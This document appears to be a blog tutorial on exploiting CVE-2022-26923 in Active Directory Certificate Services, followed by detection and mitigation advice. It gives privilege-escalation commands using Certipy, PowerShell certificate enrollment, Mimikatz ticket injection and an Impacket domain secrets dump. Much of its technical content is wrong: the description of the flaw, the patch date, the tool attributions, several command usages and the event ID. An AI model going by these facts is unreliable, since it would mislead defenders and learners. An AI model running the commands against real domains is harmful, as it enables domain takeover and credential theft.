## ”CVE-2022-26923” Abusing Certificate Services in AD

**CVE-2022-26923** targets the **Active Directory Certificate Services (ADCS)**, specifically the **Web Enrollment** interface. ADCS is responsible for managing and issuing certificates within an Active Directory environment, and it’s commonly used to issue certificates for authentication and encryption purposes.

This vulnerability occurs when **certificate templates** are **misconfigured** or **insecurely configured**, allowing a **low-privileged user** to **request a certificate** for a **privileged template** (e.g., **Domain Admin**). With this certificate, the attacker can escalate their privileges and impersonate a **Domain Admin** or other high-privileged accounts within the domain.

---

### **`2. How CVE-2022-26923 Works`**

### **Active Directory Certificate Services (ADCS)**

ADCS is part of the PKI infrastructure in **Windows environments**, and it provides services for issuing, managing, and revoking certificates. The **Web Enrollment** feature allows users to request certificates via a web interface (`certsrv`). Typically, an authorized user would request a certificate for things like **user authentication** or **email encryption**.

When certificate templates are misconfigured, even **non-administrative users** may be able to request certificates for **privileged templates**. These templates could allow users to impersonate **Domain Admins**, giving attackers a way to escalate their privileges.

### **Steps of the Exploit:**

1. **Accessing Web Enrollment**:
    - The attacker accesses the **Web Enrollment** interface of the **ADCS server** via `http://<CA-Server>/certsrv`.
    - By default, this interface should require authentication, but the attacker is able to access it due to improper configurations or weak access control policies.
2. **Identifying Privileged Templates**:
    - The attacker identifies available **certificate templates** using the Web Enrollment page. They specifically look for **Domain Admin** certificates or any templates that might allow the impersonation of high-privileged accounts.
3. **Crafting a Malicious Request**:
    - Using tools such as **PowerShell** or **Impacket**, the attacker crafts a **malicious certificate request**. The request will be for a template that could allow a **Domain Admin** to be impersonated.
4. **Certificate Issuance**:
    - In a **misconfigured ADCS** environment, the Certificate Authority (CA) will issue the certificate without proper checks, even though the attacker is not authorized for that template.
5. **Using the Privileged Certificate**:
    - The attacker then uses tools like **Mimikatz** or **Impacket** to impersonate a **Domain Admin** with the issued certificate. The attacker can now authenticate as a **Domain Admin**, gaining full control of the domain.

---

### **`3. Exploitation Process in Detail`**

Here’s a step-by-step breakdown of the exploitation:

### **Step 1: Prerequisites**

- **Access to Web Enrollment** page (`http://<CA-Server>/certsrv`).
- **Low-privileged user account**.
- **Misconfigured Certificate Templates** allowing unauthorized access.

### **Step 2: Enumerating Available Templates**

The attacker first needs to find the **certificate templates** that are available for request. The Web Enrollment page may allow them to do this by simply visiting the page.

### **Commands:**

using PowerShell to list certificate templates available to the user

```abap
# Using PowerShell to list certificate templates available to the user

Get-Certificate -Template
```

This command will list all the available certificate templates. The attacker will look for **high-privileged templates**, such as those associated with **Domain Admins**.

Alternatively, attackers can enumerate the templates using tools like **Impacket**.

```abap
Using Impacket to query for certificate templates
python3 [certipy.py](http://certipy.py/) enum -u <user> -p <password> -d <domain> -dc-ip <dc-ip>
```

### **`Step 3: Crafting the Malicious Certificate Request`**

Once the attacker identifies a **privileged template** (e.g., for **Domain Admin** certificates), they need to create a request for it.

1. **Using PowerShell**:
The attacker can use **PowerShell** to create a malicious request.

```abap
$certRequest = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
$certRequest.InitializeFromTemplate(1, "DomainAdminTemplate")
$certRequest.Encode()
$certRequest.Submit()

```

```abap
**Using Certipy (Impacket)**:
Impacket’s **certipy** can also be used to craft and submit requests for certificates.

# Requesting a certificate for a domain controller template
python3 certipy.py req -u <user> -p <password> -t <template> -domain <domain> -dc-ip <dc-ip> 

```

In this example, the attacker specifies the template that could be used to request a **Domain Admin certificate**.

### **`Step 4: Certificate Issuance`**

The CA issues the certificate because the request did not properly validate the attacker’s privileges.

- The **issued certificate** can now be used for **authentication**.

### **Step 5: Using the Privileged Certificate**

Once the attacker has the **privileged certificate**, they can use tools like **Mimikatz** to inject the certificate into **Kerberos authentication** and impersonate a **Domain Admin**.

### **Using Mimikatz to Inject the Certificate**:

```abap
mimikatz.exe "kerberos::ptt <cert-file>"
```

This command injects the certificate into the **Kerberos ticket cache**, allowing the attacker to **authenticate as a Domain Admin**.

Alternatively, the attacker can use **Impacket’s** `secretsdump.py` or `kerberos.py` to perform further actions.

```abap
# Using Impacket to dump domain secrets after impersonation
python3 [impacket-secretsdump.py](http://impacket-secretsdump.py/) <domain>/<username>:<password> -just-dc
```

### **`4. Detection and Mitigation`**

### **Detection**

1. **Monitoring Certificate Requests**:
    - **Event ID 4907** logs certificate requests. Admins should monitor for unauthorized certificate requests, especially for **high-privileged templates**.
    
    Example Event ID for certificate request:
    
    ```abap
    Event ID 4907: A certificate request has been submitted.
    ```
    
2. **Certificate Template Permissions**:
    - Ensure that **permissions** on **certificate templates** are restricted to authorized users only.
    - Review the **Web Enrollment** logs and configure proper access controls to prevent unauthorized access.
3. **Check CA Logs**:
    - Review the **Certificate Authority logs** to detect suspicious certificate issuance requests or patterns.

### **Mitigation**

1. **Patch the Vulnerability**:
    - Apply the **March 2022 Windows Security Update** to patch **CVE-2022-26923**.
2. **Restrict Certificate Template Permissions**:
    - Only allow **administrators** to request **privileged certificates**. Limit permissions on sensitive templates such as **Domain Admin** or **Domain Controller certificates**.
3. **Disable Web Enrollment if not Needed**:
    - If the **Web Enrollment** feature is not necessary, disable it entirely to prevent attackers from exploiting it.
4. **Audit and Monitor**:
    - Set up continuous auditing of **certificate templates** and **CA logs** to detect unusual or unauthorized activity.

### **5. Conclusion**

**CVE-2022-26923** is a serious vulnerability that allows an attacker to **escalate their privileges** in an Active Directory environment by exploiting **misconfigured certificate templates** in **ADCS**. Once the attacker gets hold of a **privileged certificate**, they can impersonate **Domain Admins** and take full control of the domain.

**Mitigation strategies** include patching the system, reviewing and restricting certificate template permissions, and disabling unnecessary features like **Web Enrollment**. Continuous monitoring and auditing are also critical to detect any signs of misuse or exploitation.
